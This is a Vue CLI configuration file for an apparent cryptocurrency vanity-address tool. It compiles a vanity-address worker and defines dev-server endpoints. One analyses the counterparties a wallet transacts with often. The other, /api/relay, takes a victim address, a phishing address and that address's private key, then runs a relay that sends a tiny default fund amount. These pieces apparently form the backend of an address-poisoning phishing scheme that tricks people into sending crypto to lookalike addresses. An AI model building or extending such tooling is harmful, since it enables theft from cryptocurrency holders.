const path = require('path');
const prettier = require('prettier');
const { analyzeWalletRecurrence } = require('./src/js/walletRecurrenceAnalysis');

module.exports = {
    publicPath: '',
    parallel: false,
    pwa: {
        workboxOptions: {
            skipWaiting: true,
            clientsClaim: true,
        },
    },
    devServer: {
        before(app) {
            app.get('/api/wallet-recurrence', async (req, res) => {
                try {
                    const wallet = String(req.query.wallet || '').trim();
                    const parsedTop = Number(req.query.top || 10);
                    const top = Math.min(20, Math.max(1, Number.isFinite(parsedTop) ? parsedTop : 10));
                    if (!wallet) {
                        return res.status(400).json({ error: 'wallet query parameter is required.' });
                    }

                    const result = await analyzeWalletRecurrence(wallet, {
                        apiKey: process.env.ETHERSCAN_API_KEY || '',
                        topResults: Number.isFinite(top) ? top : 10,
                    });

                    return res.json(result);
                } catch (err) {
                    return res.status(500).json({
                        error: err && err.message ? err.message : 'wallet recurrence analysis failed',
                    });
                }
            });

            app.post('/api/relay', async (req, res) => {
                try {
                    // Manual body parsing for the dev server
                    let body = '';
                    req.on('data', (chunk) => {
                        body += chunk.toString();
                    });

                    req.on('end', async () => {
                        try {
                            const params = JSON.parse(body || '{}');
                            const { victimAddress, phishingAddress, phishingPrivateKey, fundAmount, tokenAddress } =
                                params;

                            if (!victimAddress || !phishingAddress || !phishingPrivateKey) {
                                return res.status(400).json({
                                    error: 'Missing required parameters (victimAddress, phishingAddress, phishingPrivateKey).',
                                });
                            }

                            // Dynamic import for ESM module support
                            const relayPath = 'file://' + path.join(__dirname, 'src', 'js', 'relay.mjs');
                            const { executeRelay } = await import(relayPath);

                            console.log(`[dev-server] Executing relay for victim: ${victimAddress}`);
                            const result = await executeRelay({
                                victimAddress,
                                phishingAddress,
                                phishingPrivateKey,
                                fundAmount: fundAmount || '0.00002',
                                tokenAddress,
                            });

                            // BigInt serialization fix
                            const resultJson = JSON.stringify(result, (key, value) =>
                                typeof value === 'bigint' ? value.toString() : value
                            );

                            return res.status(200).send(resultJson);
                        } catch (err) {
                            console.error('[dev-server] Relay execution details failed:', err.message);
                            return res.status(500).json({ error: err.message });
                        }
                    });
                } catch (err) {
                    return res.status(500).json({ error: 'Internal server error in dev-server relay handler' });
                }
            });
        },
    },
    chainWebpack: (config) => {
        // Worker Loader
        config.module
            .rule('worker')
            .test(/vanity\.js$/)
            .use('worker-loader')
            .loader('worker-loader')
            .options({
                inline: 'no-fallback',
                filename: 'vanity.js',
            })
            .end();
    },
    configureWebpack: {
        plugins: process.env.DEPLOY
            ? [
                  new (require('prerender-spa-plugin'))({
                      staticDir: path.join(__dirname, 'dist'),
                      routes: ['/'],
                      postProcess(renderedRoute) {
                          renderedRoute.html = prettier
                              .format(renderedRoute.html, { filepath: 'index.html', printWidth: 120 })
                              .replace('render', 'prerender')
                              .replace(/(data-v-[0-9a-f]+)=""/gm, '$1');
                          return renderedRoute;
                      },
                  }),
              ]
            : [],
    },
};
